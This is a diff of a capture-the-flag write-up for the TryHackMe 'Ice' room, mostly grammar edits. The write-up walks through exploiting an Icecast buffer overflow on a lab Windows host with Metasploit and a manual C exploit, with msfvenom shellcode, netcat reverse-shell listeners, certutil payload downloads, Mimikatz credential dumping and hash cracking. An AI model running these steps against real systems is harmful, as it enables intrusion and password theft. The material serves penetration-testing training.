@@ -13,7 +13,7 @@ img_path: /assets/
 
 <a href="https://www.freepik.com/free-vector/modern-business-background-with-geometric-shapes_5287944.htm#page=3&query=powerpoint%20background&position=15&from_view=search&track=ais" target="_blank" rel="noopener noreferrer">Cover Image by BiZkettE1</a> on Freepik
 
-### Task 1 : Connect
+### Task 1: Connect
 
 Connect to our network using OpenVPN. Here is a mini walkthrough of connecting:
 
@@ -23,7 +23,7 @@ Connect to our network using OpenVPN. Here is a mini walkthrough of connecting:
 
 > No answer required
 
-2. **Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.**
+2. **Use an OpenVPN client to connect. In my example, I am on Linux and on the access page we have a Windows tutorial.**
 
 ```
 sudo openvpn filename.ovpn
@@ -31,7 +31,7 @@ sudo openvpn filename.ovpn
 
 (change "filename.ovpn" to your config file)
 
-When you run this you see lots of text, at the end it will say Initialization Sequence Completed
+When you run this you see lots of text and at the end, it will say Initialization Sequence Completed
 
 > No answer required
 
@@ -49,13 +49,13 @@ You should see a green tick next to Connected. It will also show you your intern
 
 > No answer required
 
-### Task 2 : Recon
+### Task 2: Recon
 
 1. **Deploy the machine! This may take up to three minutes to start.**
 
 > No answer required
 
-2. **Launch a scan against our target machine, I recommend using a SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room '**[**Nmap**](https://tryhackme.com/room/furthernmap)**' prior to this room.**
+2. **Launch a scan against our target machine, I recommend using an SYN scan set to scan all ports on the machine. The scan command will be provided as a hint, however, it's recommended to complete the room '**[**Nmap**](https://tryhackme.com/room/furthernmap)**' before this room.**
 
 ```
 nmap -Pn -sS -A -T4 -p- -vv -oN ice_nmapscan 10.10.2.67
@@ -63,19 +63,19 @@ nmap -Pn -sS -A -T4 -p- -vv -oN ice_nmapscan 10.10.2.67
 
 #### Command Options
 
-*   **-Pn :** No ping (Consider the machine is online)
-*   **-sS :** Stealth Scan (SYN Scan)
-*   **-A :** Aggressive Scan (OS Detection + Service Versioning + Default Nmap Scripts)
-*   **-T4 :** Timing Template (Aggressive)
-*   **-p- :** Scan all ports
-*   **-vv :** Very Verbose Output
-*   **-oN :** Save output to normal file
+* **-Pn:** No ping (Consider the machine is online)
+* **-sS:** Stealth Scan (SYN Scan)
+* **-A:** Aggressive Scan (OS Detection + Service Versioning + Default Nmap Scripts)
+* **-T4:** Timing Template (Aggressive)
+* **-p-:** Scan all ports
+* **-vv:** Very Verbose Output
+* **-oN:** Save output to normal file
 
 ![Nmap Scan Result](images/thm-ice/nmap-scan-result.png)
 
-3. **Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?**
+1. **Once the scan completes, we'll see many interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shut down), leaving very little to protect this machine. One of the interesting ports that are open is Microsoft Remote Desktop (MSRDP). What port is this open on?**
 
-On my first scan I was not able to find the service that was required to complete this question so I ran the scanner again and got the service
+On my first scan, I was not able to find the service that was required to complete this question so I ran the scanner again and got the service
 
 ```
 nmap -Pn -sS -A -T4 — script=vuln -p- -vv -oN ice_nmapscan1 10.10.2.67
@@ -87,7 +87,7 @@ nmap -Pn -sS -A -T4 — script=vuln -p- -vv -oN ice_nmapscan1 10.10.2.67
 
 ![Nmap Vulnerability Scan Results](images/thm-ice/nmap-scan-results-3.png)
 
-3. **What service did nmap identify as running on port 8000? (First word of this service)**
+3. **What service did Nmap identify as running on port 8000? (First word of this service)**
 
 > Icecast
 
@@ -95,13 +95,13 @@ nmap -Pn -sS -A -T4 — script=vuln -p- -vv -oN ice_nmapscan1 10.10.2.67
 
 > DARK-PC
 
-### Task 3 : Gain Access
+### Task 3: Gain Access
 
-1.  **Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use** [**https://www.cvedetails.com**](https://www.cvedetails.com) **for this question and the next.**
+1.  **Now that we've identified some interesting services running on our target machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high-level vulnerability with a score of 7.5 (7.4 depending on where you view it). What type of vulnerability is it? Use** [**https://www.cvedetails.com**](https://www.cvedetails.com) **for this question and the next.**
 
-Search for Icecast and look for CVE that has an Metasploit module
+Search for Icecast and look for CVE that has a Metasploit module
 
-[CVE-2004-1561 : Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with](https://www.cvedetails.com/cve/CVE-2004-1561/)
+[CVE-2004-1561: Buffer overflow in Icecast 2.0.1 and earlier allows remote attackers to execute arbitrary code via an HTTP request with](https://www.cvedetails.com/cve/CVE-2004-1561/)
 
 ![CVE Details](images/thm-ice/cve-details.png)
 
@@ -115,7 +115,7 @@ Search for Icecast and look for CVE that has an Metasploit module
 
 > No answer required
 
-4. **After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in '**[**RP: Metasploit**](https://tryhackme.com/room/rpmetasploit)**' which is recommended to be completed prior to this room, although not entirely necessary.**
+4. **After Metasploit has started, let's search for our target exploit using the command 'search icecast'. What is the full path (starting with exploit) for the exploitation module? This module is also referenced in '**[**RP: Metasploit**](https://tryhackme.com/room/rpmetasploit)**' which is recommended to be completed before this room, although not entirely necessary.**
 
 ![Search Metasploit for Exploit](images/thm-ice/metasploit-exploits.png)
 
@@ -131,9 +131,9 @@ Search for Icecast and look for CVE that has an Metasploit module
 
 > RHOSTS
 
-6. **First let's check that the LHOST option is set to our tun0 IP (which can be found on the** [**access**](https://tryhackme.com/access) **page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`**
+6. **First, let's check that the LHOST option is set to our tun0 IP (which can be found on the** [**access**](https://tryhackme.com/access) **page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`**
 
-**Note:** The tun0 IP can be found using "ip a show tun0" and looking under inet
+**Note:** The tun0 IP can be found using "ip a show tun0" and looking under Inet
 
 ![Changing Exploit Parameters|450](images/thm-ice/setting-exploit-parameters.png)
 
@@ -141,9 +141,9 @@ Search for Icecast and look for CVE that has an Metasploit module
 
 ![Running Exploit on Target](images/thm-ice/running-exploit.png)
 
-### Task 4 : Escalate
+### Task 4: Escalate
 
-1. **Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?**
+1. **Woohoo! We've gained a foothold in our victim machine! What's the name of the shell we have now?**
 
 > meterpreter
 
@@ -201,27 +201,27 @@ Search for Icecast and look for CVE that has an Metasploit module
 
 > No answer required
 
-13. **Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`**
+13. **Following completion of the privilege escalation, a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`**
 
 ![Checking Available Sessions](images/thm-ice/checking-sessions.png)
 
 > No answer required
 
-14. **We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files ?**
+14. **We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?**
 
 ![Listing available Privileges|210](images/thm-ice/available-privileges.png)
 
 > SeTakeOwnershipPrivilege
 
-### Step 5 : Looting
+### Step 5: Looting
 
-1. **Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by `NT AUTHORITY\SYSTEM` as we have escalated permissions (even though our process doesn't).**
+1. **Before further action, we need to move to a process that has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by `NT AUTHORITY\SYSTEM` as we have escalated permissions (even though our process doesn't).**
 
 ![Target System Processes](images/thm-ice/target-osint-2.png)
 
 > No answer required
 
-2. **In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?**
+2. **To interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?**
 
 Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell.
 
@@ -237,7 +237,7 @@ Mentioned within this question is the term 'living in' a process. Often when we 
 
 > NT AUTHORITY\SYSTEM
 
-5. **Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)**
+5. **Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password-dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)**
 
 ![Launching Kiwi Tool|500](images/thm-ice/kiwi-options.png)
 
@@ -259,7 +259,7 @@ Mentioned within this question is the term 'living in' a process. Often when we 
 
 > Password01!
 
-### Task 6 : Post-Exploitation
+### Task 6: Post-Exploitation
 
 1. **Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.**
 
@@ -271,7 +271,7 @@ Mentioned within this question is the term 'living in' a process. Often when we 
 
 > hashdump
 
-3. **While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?**
+3. **While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop?**
 
 ![Meterpreter Options|500](images/thm-ice/meterpreter-options.png)
 
@@ -281,7 +281,7 @@ Mentioned within this question is the term 'living in' a process. Often when we 
 
 > record_mic
 
-5. **To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to breakdown the events of the pentest after the fact.**
+5. **To complicate forensics efforts we can modify the timestamps of files on the system. What command allows us to do this? Don't ever do this on a pentest unless you're explicitly allowed to do so! This is not beneficial to the defending team as they try to break down the events of the pentest after the fact.**
 
 ![Timestomp Command|350](images/thm-ice/timestamp-command.png)
 
@@ -289,7 +289,7 @@ Mentioned within this question is the term 'living in' a process. Often when we 
 
 6. **Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?**
 
-Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
+Golden ticket attacks are a function within Mimikatz that abuses a component of Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.
 
 ![Kiwi Kerberos Command|500](images/thm-ice/kiwi-commands-2.png)
 
@@ -299,7 +299,7 @@ Golden ticket attacks are a function within Mimikatz which abuses a component to
 
 ![Enabling RDP on Target](images/thm-ice/enabling-rdp.png)
 
-We need an RDP client if order to login into the system. On Linux we can use "Remmina"
+We need an RDP client to login into the system. On Linux, we can use "Remmina"
 
 ```
 sudo apt install remmina
@@ -309,9 +309,9 @@ sudo apt install remmina
 
 > No answer required
 
-### Task 7 : Extra Credit
+### Task 7: Extra Credit
 
-**As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or via another similar exploit to further hone your skills.**
+**As you advance in your pentesting skills, you will be faced eventually with exploitation without the usage of Metasploit. Provided above is the link to one of the exploits found on Exploit DB for hijacking Icecast for remote code execution. While not required by the room, it's recommended to attempt exploitation via the provided code or another similar exploit to further hone your skills.**
 
 The exploit that is linked in the room while correct does not have any instructions on to use it. So we will have to search online if we can find an exploit with instructions
 
@@ -321,23 +321,23 @@ The exploit that is linked in the room while correct does not have any instructi
 git clone https://github.com/ivanitlearning/CVE-2004-1561.git
 ```
 
-In the repo there is an C file which is the exploit that we are going to use to try and gain access into the system. On going through the code we see there is an array called shellcode that we need to change with respect to our system in order for the exploit to work
+In the repo, there is a C file which is the exploit that we are going to use to try and gain access to the system. On going through the code we see there is an array called shellcode that we need to change for our system for the exploit to work
 
 ![Msfvenom Payload](images/thm-ice/msfvenom-payload.png)
 
-As shown in the code gets use msfvenom to generate the shellcode. Then change the value of the array shellcode in the code with the value that we generated
+As shown in the code it uses msfvenom to generate the shellcode. Then change the value of the array shellcode in the code with the value that we generated
 
 ![Changing Options for Payload](images/thm-ice/msfvenom-payload-2.png)
 
-**Note:** The value for LHOST is the IP Address of tun0 which can be found by using "ip a show tun0" and looking under inet
+**Note:** The value for LHOST is the IP Address of tun0 which can be found by using "ip a show tun0" and looking under Inet
 
-Lets compile the code
+Let's compile the code
 
 ```
 gcc 568-edit.c -o 568
 ```
 
-Before we use the exploit we need to setup a listener on our system to be able to connect to the reverse shell
+Before we use the exploit we need to set up a listener on our system to be able to connect to the reverse shell
 
 ```
 sudo netcat -nvlp 443
@@ -347,13 +347,13 @@ sudo netcat -nvlp 443
 
 ![Access Target using Payload|380](images/thm-ice/payload-target-access.png)
 
-As we can see we have got managed to gain access into the system.
+As we can see we have got managed to gain access to the system.
 
 ![Listing current User|340](images/thm-ice/target-osint-3.png)
 
-We see that we are logged in as user DARK our next goal should be escalate our privileges. We can use the Windows Exploit Suggester script to see if we can find any vulnerabilities on the system that we can use to elevate our privileges.
+We see that we are logged in as user DARK our next goal should be to escalate our privileges. We can use the Windows Exploit Suggester script to see if we can find any vulnerabilities on the system that we can use to elevate our privileges.
 
-[GitHub - AonCyberLabs/Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+[GitHub - AonCyberLabs/Windows-Exploit-Suggester: This tool compares a targets patch levels against the Microsoft vulnerability database to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
 ```
 git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
@@ -373,17 +373,17 @@ python -m pip install xlrd==1.2.0
 
 **Note:** `[E]` exploitdb PoC, `[M]` Metasploit module, `[*]` missing bulletin
 
-The script was able to find multiple vulnerabilities that are possibly present on the system. MS14–058 looks like it allows us to execute remote code on the system so lets see we can find code for this vulnerability.
+The script was able to find multiple vulnerabilities that are possibly present in the system. MS14–058 looks like it allows us to execute remote code on the system so let's see if we can find code for this vulnerability.
 
 [windows-kernel-exploits/CVE-2014-4113-Exploit.rar at master · SecWiki/windows-kernel-exploits · GitHub](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS14-058/CVE-2014-4113-Exploit.rar)
 
 ![CVE Details|540](images/thm-ice/csv-details-github.png)
 
-Now we need to create a payload so that we run the payload using the exploit we are able to get an session with system privileges.
+Now we need to create a payload so that we run the payload using the exploit we can get a session with system privileges.
 
 ![Creating exploit using Msfvenom](images/thm-ice/msfvenom-payload-creation.png)
 
-Now that we have our payload and exploit lets upload then on to the target machine. For this on your machine we can setup an Python HTTP Server and use certutil on Windows to download the files from the server
+Now that we have our payload and exploit let's upload them onto the target machine. For this, on your machine, we can set up a Python HTTP Server and use certutil on Windows to download the files from the server
 
 ```
 python3 -m http.server 1234
@@ -397,33 +397,33 @@ certutil -urlcache -f http://<server-ip-address>:<port>/<filename> <output-filen
 
 [Downloading Files with Certutil - Red Team Notes](https://www.ired.team/offensive-security/defense-evasion/downloading-file-with-certutil)
 
-So that we are able to connect to the reverse shell that the payload with create we need to setup an netcat listener
+So that we can connect to the reverse shell that the payload with create we need to set up a Netcat listener
 
 ```
 netcat -nvlp 1235
 ```
 
-Lets run the payload using the exploit on the target machine
+Let's run the payload using the exploit on the target machine
 
 ![Running Exploit|350](images/thm-ice/running-exploit-2.png)
 
 ![List Current User|480](images/thm-ice/listing-users.png)
 
-We have got an connection and when we run "whoami" we see that we are `nt authority\system` which means we gained admin access on the system
+We have got a connection and when we run "whoami" we see that we are `nt authority\system` which means we gained admin access to the system
 
-Now lets try to crack the password for the user DARK for that we will make use of tool called "[Mimikatz](https://github.com/gentilkiwi/mimikatz)"
+Now let's try to crack the password for the user DARK for that we will make use of a tool called "[Mimikatz](https://github.com/gentilkiwi/mimikatz)"
 
 [GitHub - gentilkiwi/mimikatz: A little tool to play with Windows security](https://github.com/gentilkiwi/mimikatz)
 
-Lets upload the executable file to the Windows system
+Let's upload the executable file to the Windows system
 
 ![Downloading Mimikatz](images/thm-ice/downloading-mimikatz.png)
 
-By using the command "lsadump::sam" can can dump the contents of the SAM database that consist of the hashes of the users on the system
+By using the command "lsadump::sam" can dump the contents of the SAM database that consist of the hashes of the users on the system
 
 ![Dumping LSM Hashes|500](images/thm-ice/dumping-lsm-hashes.png)
 
-Lets use the Hash on Crackstation and see if we are able to crach the hash
+Let's use the Hash on Crackstation and see if we can crack the hash
 
 [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
 
